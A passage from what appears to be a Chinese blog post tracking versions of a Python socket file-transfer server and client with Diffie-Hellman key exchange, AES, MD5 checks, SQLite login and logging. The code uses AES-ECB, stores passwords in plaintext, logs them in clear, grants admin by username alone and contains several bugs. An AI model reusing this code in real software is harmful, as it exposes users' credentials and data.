print(&quot;开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_client.exchange(public_key_server)</span><br><span class="line">    Authentication(s,shared_key)</span><br><span class="line">    print(&quot;成功连接&quot;)</span><br><span class="line">    while 1:</span><br><span class="line">        print((s.recv(1024)).decode())</span><br><span class="line">        choice = input(choice_text)</span><br><span class="line">        if choice == &quot;1&quot;:</span><br><span class="line">            transfer_txt(s,shared_key)</span><br><span class="line">        elif choice == &quot;2&quot;:</span><br><span class="line">            transfer_file(s,shared_key)</span><br><span class="line">        elif choice == &quot;3&quot;:</span><br><span class="line">            register(s,shared_key)</span><br><span class="line">        elif choice == &quot;4&quot;:</span><br><span class="line">            print(&quot;程序终止&quot;)</span><br><span class="line">            s.close()</span><br><span class="line">            exit()</span><br><span class="line">        else :</span><br><span class="line">            print(&quot;未找到输入的选项，请重新输入&quot;)</span><br><span class="line">            continue</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>服务端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import magic</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import sqlite3</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">mime = magic.Magic(mime=True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class query_thread(threading.Thread):</span><br><span class="line">    </span><br><span class="line">    def __init__(self,name = None):</span><br><span class="line">        threading.Thread.__init__(self,name=name)</span><br><span class="line"></span><br><span class="line">    def query_username(self,username):</span><br><span class="line">        conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,))</span><br><span class="line">        result = cursor.fetchone()</span><br><span class="line">        cursor.close()</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def query_password(self,username,password):</span><br><span class="line">        conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        cursor.execute(&quot;SELECT password FROM users WHERE username = ? AND password = ?&quot;, (username, password))</span><br><span class="line">        result = cursor.fetchone()</span><br><span class="line">        cursor.close()</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def add_user(sock,username,password):</span><br><span class="line">        conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        try:</span><br><span class="line">            # 插入新的用户数据</span><br><span class="line">            cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (username, password))</span><br><span class="line">            conn.commit()</span><br><span class="line">            sock.send(&quot;用户注册成功&quot;.encode())</span><br><span class="line">        except sqlite3.IntegrityError:</span><br><span class="line">            sock.send(&quot;用户已存在&quot;.encode())</span><br><span class="line">        except Exception as e:</span><br><span class="line">            sock.send(e.encode())</span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):</span><br><span class="line">    if isinstance(data, str): </span><br><span class="line">        data = data.encode()  # md5加密需要bytes参数</span><br><span class="line">    md5_hash = hashlib.md5()  #md5加密</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    </span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def key_switch(sock,public_key_server):</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;开始进行公钥交换&quot;)</span><br><span class="line">    try:</span><br><span class="line">        public_key_client = sock.recv(1024)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;接受错误&quot;,e)</span><br><span class="line">    </span><br><span class="line">    public_key_bytes = public_key_server.public_bytes(    #将客户端的公钥序列化为 PEM 格式的字节串</span><br><span class="line">    encoding=serialization.Encoding.PEM,  </span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    sock.send(public_key_bytes)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_client) #将接受到的服务端公钥反序列化为公钥对象</span><br><span class="line"></span><br><span class="line">def decrypt_data(shared_key,data):   #data要为byte型</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    decrypted_data = aes.decrypt(data)</span><br><span class="line">    data = (unpad(decrypted_data, 16)).decode(&#x27;latin1&#x27;)</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">def unpack_data(sock,shared_key,orign_data):     #拆解数据包</span><br><span class="line">    sliced_sum = int.from_bytes(orign_data[:2],byteorder = &#x27;big&#x27;)</span><br><span class="line">    sliced_num = int.from_bytes(orign_data[2:4],byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_length = int.from_bytes(orign_data[4:8], byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_type = int.from_bytes(orign_data[8:12], byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_md5 = (orign_data[-32:]).decode()</span><br><span class="line">    data = decrypt_data(shared_key,orign_data[12:(data_length-32)])</span><br><span class="line">    value = verify_md5(data,data_md5)</span><br><span class="line">    if value == 0:</span><br><span class="line">        sock.send((f&quot;第&#123;sliced_num+1&#125;组数据校验成功&quot;).encode())</span><br><span class="line">    else :</span><br><span class="line">        sock.send((f&quot;第&#123;sliced_num+1&#125;组数据校验失败&quot;).encode())</span><br><span class="line">    return sliced_sum,sliced_num,data_type,data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Authentication(sock,shared_key,query_thread1):  #身份验证部分 账号密码存储在users.db数据库中</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    username = (sock.recv(1024))</span><br><span class="line">    username = decrypt_data(shared_key,username)</span><br><span class="line">    result = query_thread1.query_username(username)</span><br><span class="line">    if result != None:</span><br><span class="line">        sock.send(f&quot;找到用户&#123;username&#125; 接下来进行密码验证&quot;.encode())</span><br><span class="line">        password = (sock.recv(1024))</span><br><span class="line">        decrypted_password = aes.decrypt(password)</span><br><span class="line">        password = (unpad(decrypted_password, 16)).decode()</span><br><span class="line">        result = query_thread1.query_password(username,password)</span><br><span class="line">        if result != None:</span><br><span class="line">            sock.send(&quot;身份验证通过&quot;.encode())</span><br><span class="line">            if username == &quot;admin&quot;:</span><br><span class="line">                permission_value = 1    </span><br><span class="line">            else :</span><br><span class="line">                permission_value = 0    </span><br><span class="line">            return permission_value</span><br><span class="line">        else :</span><br><span class="line">            sock.send(&quot;密码错误，终止连接&quot;.encode())</span><br><span class="line">            sock.close()</span><br><span class="line">            return 3</span><br><span class="line">    else:</span><br><span class="line">        sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode())</span><br><span class="line">        sock.close()</span><br><span class="line">        return 3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def menu(sock):</span><br><span class="line">    text = &quot;开始进行数据传输&quot;</span><br><span class="line">    sock.send(text.encode())</span><br><span class="line"></span><br><span class="line">def transfer_txt(addr,data):</span><br><span class="line">    print(f&quot;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def transfer_file(sock,data):  #处理非切片数据</span><br><span class="line">    data_type = mime.from_buffer(data)</span><br><span class="line">    filename = &quot;output/&quot;+threading.current_thread().name</span><br><span class="line">    try:</span><br><span class="line">        if data_type == &quot;text/plain&quot;:</span><br><span class="line">            filename += &quot;.txt&quot;</span><br><span class="line">            with open(filename, &#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data)</span><br><span class="line">        elif data_type == &quot;text/x-c&quot;:</span><br><span class="line">            filename += &quot;.c&quot;</span><br><span class="line">            with open(filename,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data)</span><br><span class="line">        else :</span><br><span class="line">            print(f&quot;没有识别到文件类型&#123;data_type&#125;,暂时存放在temp中&quot;)</span><br><span class="line">            filename += &quot;-temp&quot;</span><br><span class="line">            with open(filename,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data)</span><br><span class="line">        sock.send(&quot;\n成功接受到文件&quot;.encode())</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:成功接受到文件&#123;filename&#125;&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        text = f&quot;保存文件时发生错误 错误信息:&#123;e&#125;&quot;</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:&quot;+text)</span><br><span class="line">        sock.send(text.encode())</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def transfer_file2(sock,data,sliced_sum,sliced_num,shared_key): #处理切片数据</span><br><span class="line">    data_bytes = data</span><br><span class="line">    while sliced_num != sliced_sum-1:</span><br><span class="line">        orign_data = (sock.recv(3000))</span><br><span class="line">        if len(orign_data) == 0:</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;)</span><br><span class="line">            return</span><br><span class="line">        sliced_sum,sliced_num,data_type,data = unpack_data(sock,shared_key,orign_data)</span><br><span class="line">        data_bytes += data</span><br><span class="line">    data_bytes = data_bytes.encode(&#x27;latin1&#x27;)</span><br><span class="line">    data_type = mime.from_buffer(data_bytes)</span><br><span class="line">    filename = &quot;output/&quot;+threading.current_thread().name</span><br><span class="line">    try:</span><br><span class="line">        if data_type == &quot;image/png&quot;:</span><br><span class="line">            filename += &quot;.png&quot;</span><br><span class="line">            with open(filename, &#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data_bytes)</span><br><span class="line">        elif data_type == &quot;audio/mpeg&quot;:</span><br><span class="line">            filename += &quot;.mp3&quot;</span><br><span class="line">            with open(filename, &#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data_bytes)</span><br><span class="line">        elif data_type == &quot;text/x-c&quot;:</span><br><span class="line">            filename += &quot;.c&quot;</span><br><span class="line">            with open(filename,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data_bytes)</span><br><span class="line">        else:</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:没有识别到文件类型&#123;data_type&#125;,暂时存放在temp中&quot;)</span><br><span class="line">            filename += &quot;-temp&quot;</span><br><span class="line">            with open(filename,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data_bytes)</span><br><span class="line">        sock.send(&quot;\n成功接受到文件&quot;.encode())</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:成功接受到文件&#123;filename&#125;&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        text = f&quot;保存文件时发生错误 错误信息:&#123;e&#125;&quot;</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:&quot;+text)</span><br><span class="line">        sock.send(text.encode())</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def register(permission_value,sock,data,query_thread1):</span><br><span class="line">    if permission_value == 0:                #管理员权限的检验较为简单</span><br><span class="line">        sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode())</span><br><span class="line">        return</span><br><span class="line">    else :  </span><br><span class="line">        parts = data.split(b&#x27;;&#x27;)</span><br><span class="line">        username = parts[0]</span><br><span class="line">        password = parts[1]</span><br><span class="line">        query_thread1.adduser(sock,username,password)</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:用户&#123;username&#125;注册成功&quot;)</span><br><span class="line"></span><br><span class="line">def verify_md5(data, original_md5):</span><br><span class="line">    current_md5 = md5_encrypt(data)</span><br><span class="line">    return current_md5 == original_md5</span><br><span class="line"></span><br><span class="line">def transfer_function(sock,addr,public_key_server,private_key_server,query_thread1):</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;连接成功&quot;)</span><br><span class="line">    public_key_client = key_switch(sock,public_key_server)</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;公钥交换成功&quot;)</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_server.exchange(public_key_client)</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:开始进行身份验证&quot;)</span><br><span class="line">    permission_value = Authentication(sock,shared_key,query_thread1)</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:身份验证通过 开始处理客户机&#123;addr&#125;的数据传输&quot;)</span><br><span class="line">    if permission_value == 3:</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;)</span><br><span class="line">        return</span><br><span class="line">    while 1:</span><br><span class="line">        menu(sock)</span><br><span class="line">        orign_data = (sock.recv(3000))</span><br><span class="line">        if len(orign_data) == 0:</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;)</span><br><span class="line">            break</span><br><span class="line">        sliced_sum,sliced_num,data_type,data = unpack_data(sock,shared_key,orign_data)</span><br><span class="line">        if data_type == 1:</span><br><span class="line">            transfer_txt(addr,data)</span><br><span class="line">        elif data_type == 2:</span><br><span class="line">            if sliced_sum != 0 or sliced_num != 0:</span><br><span class="line">                transfer_file2(sock,data,sliced_sum,sliced_num,shared_key)</span><br><span class="line">            else:</span><br><span class="line">                transfer_file(sock,data)</span><br><span class="line">        elif data_type ==3:</span><br><span class="line">            register(permission_value,sock,data,query_thread1)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line"></span><br><span class="line">    pool = ThreadPoolExecutor(max_workers=5)   #定义一个线程池 拥有5个空闲线程</span><br><span class="line">    query_thread1 = query_thread()  #定义一个线程对象 后面用于数据库查询 因为数据库查询只能放在一个线程里使用</span><br><span class="line">    </span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    private_key_server = parameters.generate_private_key()</span><br><span class="line">    public_key_server = private_key_server.public_key()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议</span><br><span class="line">    s.bind((&quot;10.0.137.2&quot;,6666))</span><br><span class="line">    s.listen(5) #最多连接5个客户端</span><br><span class="line">    while 1:</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:等待客户机连接&quot;)</span><br><span class="line">        sock,addr = s.accept()</span><br><span class="line">        </span><br><span class="line">        client_thread = pool.submit(transfer_function,sock,addr,public_key_server,private_key_server,query_thread1)</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="v0-8"><a href="#v0-8" class="headerlink" title="v0.8"></a>v0.8</h2><p>这一版本的目的在于增加日志功能 因为就目前来说 一旦连接的客户机多了 服务端那边的输出就会比较混乱<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411071143676.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411071143676.png" alt="image.png"></a><br>具体的实现应该也比较简单  在accpet连接后就创建一个文件以及字符串(作为记录该客户机操作记录的缓冲区)<br>然后在检测客户机中断连接后就把缓冲区的内容写入日志 并且加入时间 来方便朔源<br>或者直接在执行对应操作后就写入日志 不过从理论上来说应该是前者的方案更加节省资源<br>预计难点在于在哪里塞入判断来check什么时候写入日志 所以还是选择后者吧<br>同时还把原本写的和屎一样的传输数据类型转化优化了一下 变成了好闻的屎<br>服务端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import magic</span><br><span class="line">import time</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import sqlite3</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">mime = magic.Magic(mime=True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write_log(log_file,text):</span><br><span class="line">    current_time = time.asctime(time.localtime(time.time()))</span><br><span class="line">    text += &quot;   &quot;+current_time</span><br><span class="line">    log_file.write(text.encode()+b&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">class query_thread(threading.Thread):</span><br><span class="line">    </span><br><span class="line">    def __init__(self,name = None):</span><br><span class="line">        threading.Thread.__init__(self,name=name)</span><br><span class="line"></span><br><span class="line">    def query_username(self,username):</span><br><span class="line">        conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,))</span><br><span class="line">        result = cursor.fetchone()</span><br><span class="line">        cursor.close()</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def query_password(self,username,password):</span><br><span class="line">        conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        cursor.execute(&quot;SELECT password FROM users WHERE username = ? AND password = ?&quot;, (username, password))</span><br><span class="line">        result = cursor.fetchone()</span><br><span class="line">        cursor.close()</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def add_user(sock,username,password):</span><br><span class="line">        conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        try:</span><br><span class="line">            # 插入新的用户数据</span><br><span class="line">            cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (username, password))</span><br><span class="line">            conn.commit()</span><br><span class="line">            sock.send(&quot;用户注册成功&quot;.encode())</span><br><span class="line">        except sqlite3.IntegrityError:</span><br><span class="line">            sock.send(&quot;用户已存在&quot;.encode())</span><br><span class="line">        except Exception as e:</span><br><span class="line">            sock.send(e.encode())</span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):</span><br><span class="line">    if isinstance(data, str): </span><br><span class="line">        data = data.encode()  # md5加密需要bytes参数</span><br><span class="line">    md5_hash = hashlib.md5()  #md5加密</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    </span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def key_switch(sock,public_key_server):</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;开始进行公钥交换&quot;)</span><br><span class="line">    try:</span><br><span class="line">        public_key_client = sock.recv(1024)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;接受错误&quot;,e)</span><br><span class="line">    </span><br><span class="line">    public_key_bytes = public_key_server.public_bytes(    #将客户端的公钥序列化为 PEM 格式的字节串</span><br><span class="line">    encoding=serialization.Encoding.PEM,  </span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    sock.send(public_key_bytes)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_client) #将接受到的服务端公钥反序列化为公钥对象</span><br><span class="line"></span><br><span class="line">def decrypt_data(shared_key,data):   #data要为byte型</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    decrypted_data = aes.decrypt(data)</span><br><span class="line">    data = (unpad(decrypted_data, 16))</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">def unpack_data(sock,shared_key,orign_data,log_file,addr):     #拆解数据包</span><br><span class="line">    sliced_sum = int.from_bytes(orign_data[:2],byteorder = &#x27;big&#x27;)</span><br><span class="line">    sliced_num = int.from_bytes(orign_data[2:4],byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_length = int.from_bytes(orign_data[4:8], byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_type = int.from_bytes(orign_data[8:12], byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_md5 = (orign_data[-32:]).decode()</span><br><span class="line">    data = decrypt_data(shared_key,orign_data[12:(data_length-32)])</span><br><span class="line">    value = verify_md5(data,data_md5)</span><br><span class="line">    if value == 0:</span><br><span class="line">        sock.send((f&quot;第&#123;sliced_num+1&#125;组数据校验失败&quot;).encode())</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;传输数据过程中第&#123;sliced_num+1&#125;组数据校验失败&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">    else :</span><br><span class="line">        sock.send((f&quot;第&#123;sliced_num+1&#125;组数据校验成功&quot;).encode())</span><br><span class="line">    return sliced_sum,sliced_num,data_type,data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Authentication(sock,shared_key,query_thread1,addr,log_file):  #身份验证部分 账号密码存储在users.db数据库中</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    username = (sock.recv(1024))</span><br><span class="line">    if len(username) == 0:</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;中断连接&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        log_file.close()</span><br><span class="line">        sock.close()</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;)</span><br><span class="line">        return             </span><br><span class="line">    username = decrypt_data(shared_key,username)</span><br><span class="line">    username = username.decode()</span><br><span class="line">    result = query_thread1.query_username(username)</span><br><span class="line">    if result != None:</span><br><span class="line">        sock.send(f&quot;找到用户&#123;username&#125; 接下来进行密码验证&quot;.encode())</span><br><span class="line">        password = (sock.recv(1024))</span><br><span class="line">        if len(password) == 0:</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;中断连接&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">            log_file.close()</span><br><span class="line">            sock.close()</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;)</span><br><span class="line">            return</span><br><span class="line">        password = decrypt_data(shared_key,password)</span><br><span class="line">        password = password.decode()</span><br><span class="line">        result = query_thread1.query_password(username,password)</span><br><span class="line">        if result != None:</span><br><span class="line">            sock.send(&quot;身份验证通过&quot;.encode())</span><br><span class="line">            if username == &quot;admin&quot;:</span><br><span class="line">                permission_value = 1    </span><br><span class="line">            else :</span><br><span class="line">                permission_value = 0    </span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;使用用户名(&#123;username&#125;)密码(&#123;password&#125;)进行身份验证通过&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">            return permission_value,username</span><br><span class="line">        else :</span><br><span class="line">            sock.send(&quot;密码错误，终止连接&quot;.encode())</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;尝试登录用户(&#123;username&#125;)输入密码(&#123;password&#125;),密码错误登录失败&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">            sock.close()</span><br><span class="line">            return 3,username</span><br><span class="line">    else:</span><br><span class="line">        sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode())</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;尝试登录用户(&#123;username&#125;),但是用户不存在&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.close()</span><br><span class="line">        return 3,username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def menu(sock):</span><br><span class="line">    text = &quot;开始进行数据传输&quot;</span><br><span class="line">    sock.send(text.encode())</span><br><span class="line"></span><br><span class="line">def transfer_txt(addr,data,log_file):</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;&quot;)</span><br><span class="line">    current_time = time.asctime(time.localtime(time.time()))</span><br><span class="line">    text = f&quot;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;   &quot;+current_time</span><br><span class="line">    write_log(log_file,text)</span><br><span class="line"></span><br><span class="line">def transfer_file(sock,data,addr,log_file):  #处理非切片数据</span><br><span class="line">    data_type = mime.from_buffer(data)</span><br><span class="line">    filename = &quot;output/&quot;+addr</span><br><span class="line">    try:</span><br><span class="line">        if data_type == &quot;text/plain&quot;:</span><br><span class="line">            filename += &quot;.txt&quot;</span><br><span class="line">            with open(filename, &#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data)</span><br><span class="line">        elif data_type == &quot;text/x-c&quot;:</span><br><span class="line">            filename += &quot;.c&quot;</span><br><span class="line">            with open(filename,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data)</span><br><span class="line">        else :</span><br><span class="line">            print(f&quot;没有识别到文件类型&#123;data_type&#125;,暂时存放在temp中&quot;)</span><br><span class="line">            filename += &quot;-temp&quot;</span><br><span class="line">            with open(filename,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data)</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;传输了&#123;filename&#125;&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.send(&quot;\n成功接受到文件&quot;.encode())</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:成功接受到文件&#123;filename&#125;&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        text = f&quot;保存文件时发生错误 错误信息:&#123;e&#125;&quot;</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:&quot;+text)</span><br><span class="line">        text = f&quot;客户机保存文件时发生错误 错误信息&#123;e&#125;&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.send(text.encode())</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def transfer_file2(sock,data,sliced_sum,sliced_num,shared_key,addr,log_file): #处理切片数据</span><br><span class="line">    data_bytes = data</span><br><span class="line">    while sliced_num != (sliced_sum-1):</span><br><span class="line">        orign_data = (sock.recv(3000))</span><br><span class="line">        if len(orign_data) == 0:</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;中断连接&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">            log_file.close()</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;)       </span><br><span class="line">            sock.close()     </span><br><span class="line">            return</span><br><span class="line">        sliced_sum,sliced_num,data_type,data = unpack_data(sock,shared_key,orign_data,log_file,addr)</span><br><span class="line">        data_bytes += data</span><br><span class="line">    data_type = mime.from_buffer(data_bytes)</span><br><span class="line">    filename = &quot;output/&quot;+addr</span><br><span class="line">    try:</span><br><span class="line">        if data_type == &quot;image/png&quot;:</span><br><span class="line">            filename += &quot;.png&quot;</span><br><span class="line">            with open(filename, &#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data_bytes)</span><br><span class="line">        elif data_type == &quot;audio/mpeg&quot;:</span><br><span class="line">            filename += &quot;.mp3&quot;</span><br><span class="line">            with open(filename, &#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data_bytes)</span><br><span class="line">        elif data_type == &quot;text/x-c&quot;:</span><br><span class="line">            filename += &quot;.c&quot;</span><br><span class="line">            with open(filename,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data_bytes)</span><br><span class="line">        else:</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:没有识别到文件类型&#123;data_type&#125;,暂时存放在temp中&quot;)</span><br><span class="line">            filename += &quot;-temp&quot;</span><br><span class="line">            with open(filename,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data_bytes)</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;传输了&#123;filename&#125;&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.send(&quot;\n成功接受到文件&quot;.encode())</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:成功接受到文件&#123;filename&#125;&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        text = f&quot;保存文件时发生错误 错误信息:&#123;e&#125;&quot;</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:&quot;+text)</span><br><span class="line">        text = f&quot;客户机保存文件时发生错误 错误信息&#123;e&#125;&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.send(text.encode())</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def register(permission_value,sock,data,query_thread1,log_file,addr,login_username):</span><br><span class="line">    if permission_value == 0:                #管理员权限的检验较为简单</span><br><span class="line">        sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode())</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;尝试使用非管理员权限用户(&#123;login_username&#125;)注册新用户&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        return</span><br><span class="line">    else :  </span><br><span class="line">        parts = data.split(b&#x27;;&#x27;)</span><br><span class="line">        username = parts[0]</span><br><span class="line">        password = parts[1]</span><br><span 